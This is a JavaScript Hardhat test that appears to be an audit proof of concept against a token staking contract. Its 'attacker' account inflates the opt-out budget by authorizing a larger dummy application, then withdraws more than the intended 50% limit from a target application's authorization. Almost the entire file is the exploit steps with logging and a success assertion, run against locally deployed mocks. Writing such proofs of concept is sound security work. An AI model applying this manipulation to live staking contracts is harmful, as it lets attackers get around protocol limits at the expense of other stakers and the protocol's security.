// PoC: OptOut Logic Manipulation
// This test demonstrates exploiting the opt-out logic to withdraw more than 50% from a targeted authorization by inflating the opt-out budget with a larger dummy authorization.

const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("PoC: OptOut Logic Manipulation", function () {
  let TokenStaking, TToken, staking, tToken;
  let deployer, attacker;
  let targetAppContract, dummyAppContract;
  const stakeAmount = ethers.utils.parseUnits("300000", 18);
  const targetAuth = ethers.utils.parseUnits("100000", 18);
  const dummyAuth = ethers.utils.parseUnits("200000", 18);

  before(async () => {
    [deployer, attacker] = await ethers.getSigners();
    TokenStaking = await ethers.getContractFactory("ExtendedTokenStaking");
    TToken = await ethers.getContractFactory("T");
    tToken = await TToken.deploy();
    await tToken.deployed();
    // Mint to attacker
    await tToken.mint(attacker.address, stakeAmount);
    staking = await TokenStaking.connect(deployer).deploy(tToken.address);
    await staking.deployed();
    await staking.connect(deployer).initialize();
    // Deploy mock application contracts
    const ApplicationMock = await ethers.getContractFactory("ApplicationMock");
    targetAppContract = await ApplicationMock.deploy(staking.address);
    await targetAppContract.deployed();
    dummyAppContract = await ApplicationMock.deploy(staking.address);
    await dummyAppContract.deployed();
    // Approve staking contract
    await tToken.connect(attacker).approve(staking.address, stakeAmount);
    // Attacker stakes
    await staking.connect(attacker).stake(
      attacker.address,
      attacker.address,
      attacker.address,
      stakeAmount
    );
    // Approve both applications
    await staking.connect(deployer).approveApplication(targetAppContract.address);
    await staking.connect(deployer).approveApplication(dummyAppContract.address);
    // Authorize target app
    await staking.connect(attacker).increaseAuthorization(
      attacker.address,
      targetAppContract.address,
      targetAuth
    );
    // Authorize dummy app with larger amount
    await staking.connect(attacker).increaseAuthorization(
      attacker.address,
      dummyAppContract.address,
      dummyAuth
    );
  });

  it("should exploit opt-out logic to withdraw more than 50% from target app", async () => {
    // Step 1: Log initial authorizations (using known values)
    console.log(`[LOG] Target App Authorization (set): ${ethers.utils.formatUnits(targetAuth, 18)} T`);
    console.log(`[LOG] Dummy App Authorization (set): ${ethers.utils.formatUnits(dummyAuth, 18)} T`);

    // Step 2: Log max authorization and available opt-out
    const maxAuth = await staking.getMaxAuthorization(attacker.address);
    console.log(`[LOG] Max Authorization (should be dummy): ${ethers.utils.formatUnits(maxAuth, 18)} T`);
    const availableOptOut = await staking.getAvailableOptOutAmount(attacker.address);
    console.log(`[LOG] Available Opt-Out Amount: ${ethers.utils.formatUnits(availableOptOut, 18)} T`);

    // Step 3: Log intended 50% limit for target app
    const intendedLimit = targetAuth.div(2);
    console.log(`[LOG] Intended 50% Limit for Target App: ${ethers.utils.formatUnits(intendedLimit, 18)} T`);

    // Step 4: Execute exploit and log transaction
    const tx = await staking.connect(attacker).optOutDecreaseAuthorization(
      attacker.address,
      availableOptOut
    );
    await tx.wait();
    console.log(`[LOG] Opt-Out Decrease Tx Hash: ${tx.hash}`);

    // Step 5: Log post-exploit available opt-out and max authorization
    const postMaxAuth = await staking.getMaxAuthorization(attacker.address);
    const postAvailableOptOut = await staking.getAvailableOptOutAmount(attacker.address);
    console.log(`[LOG] Post-Exploit Max Authorization: ${ethers.utils.formatUnits(postMaxAuth, 18)} T`);
    console.log(`[LOG] Post-Exploit Available Opt-Out: ${ethers.utils.formatUnits(postAvailableOptOut, 18)} T`);

    // Step 6: Key assertion: withdrawn amount > intended limit
    console.log(`[LOG] Amount Actually Withdrawn: ${ethers.utils.formatUnits(availableOptOut, 18)} T`);
    expect(availableOptOut).to.be.gt(intendedLimit);
  });
});
